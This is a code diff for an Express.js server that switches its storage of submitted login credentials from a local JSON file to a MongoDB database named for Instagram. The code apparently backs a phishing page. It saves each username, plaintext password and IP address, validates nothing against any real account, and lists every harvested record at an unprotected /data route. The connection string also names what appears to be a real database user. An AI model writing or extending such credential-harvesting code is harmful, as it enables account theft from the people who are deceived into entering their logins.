@@ -1,82 +1,78 @@
 const express = require("express");
-const fs = require("fs");
+const mongoose = require("mongoose");
 const path = require("path");
+const cors = require("cors");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const DATA_FILE = path.join(__dirname, "data", "logins.json");
+
+// MongoDB connection string — replace YOUR_PASSWORD_HERE with your real password
+const MONGO_URI =
+  "mongodb+srv://pavank01437:YOUR_PASSWORD_HERE@instagram-login.vbztrin.mongodb.net/instagram?appName=Instagram-login";
 
 // Middleware
+app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-const cors = require("cors");
-app.use(cors());
 app.use(express.static(path.join(__dirname, "public")));
 
-// Ensure data file exists
-if (!fs.existsSync(DATA_FILE)) {
-  fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
-  console.log("📁 Created data/logins.json");
-}
+// Login Schema
+const loginSchema = new mongoose.Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true },
+  timestamp: { type: Date, default: Date.now },
+  ip: { type: String },
+});
 
-// Serve the login page
+const Login = mongoose.model("Login", loginSchema);
+
+// Connect to MongoDB
+mongoose
+  .connect(MONGO_URI)
+  .then(() => console.log("✅ Connected to MongoDB Atlas"))
+  .catch((err) => console.error("❌ MongoDB connection error:", err));
+
+// Serve login page
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-// Handle login form submission
-app.post("/login", (req, res) => {
+// Save login data
+app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
   if (!username || !password) {
     return res
       .status(400)
-      .json({ success: false, message: "All fields are required." });
+      .json({ success: false, message: "All fields required." });
   }
 
-  // Read existing data
-  let logins = [];
   try {
-    const raw = fs.readFileSync(DATA_FILE, "utf8");
-    logins = JSON.parse(raw);
+    const newLogin = new Login({
+      username: username.trim(),
+      password: password,
+      ip: req.ip || "unknown",
+    });
+
+    await newLogin.save();
+    console.log(`✅ Saved — User: ${username}`);
+    return res.json({ success: true, message: "Login saved!" });
   } catch (err) {
-    logins = [];
+    console.error("Save error:", err);
+    return res.status(500).json({ success: false, message: "Server error." });
   }
-
-  // Append new entry
-  const newEntry = {
-    id: logins.length + 1,
-    username: username.trim(),
-    password: password,
-    timestamp: new Date().toISOString(),
-    ip: req.ip || "unknown",
-  };
-
-  logins.push(newEntry);
-
-  // Write back to file
-  fs.writeFileSync(DATA_FILE, JSON.stringify(logins, null, 2));
-
-  console.log(
-    `✅ Login saved — User: ${username} | Time: ${newEntry.timestamp}`,
-  );
-
-  return res.json({ success: true, message: "Login saved successfully!" });
 });
 
-// View all saved logins (optional admin route)
-app.get("/data", (req, res) => {
+// View all saved logins
+app.get("/data", async (req, res) => {
   try {
-    const raw = fs.readFileSync(DATA_FILE, "utf8");
-    const logins = JSON.parse(raw);
+    const logins = await Login.find().sort({ timestamp: -1 });
     res.json({ total: logins.length, logins });
-  } catch {
-    res.json({ total: 0, logins: [] });
+  } catch (err) {
+    res.status(500).json({ error: "Failed to fetch data." });
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`\n🚀 Server running at: http://localhost:${PORT}`);
-  console.log(`📂 Data saved to: data/logins.json`);
-  console.log(`📊 View saved data: http://localhost:${PORT}/data\n`);
+  console.log(`🚀 Server running at http://localhost:${PORT}`);
 });
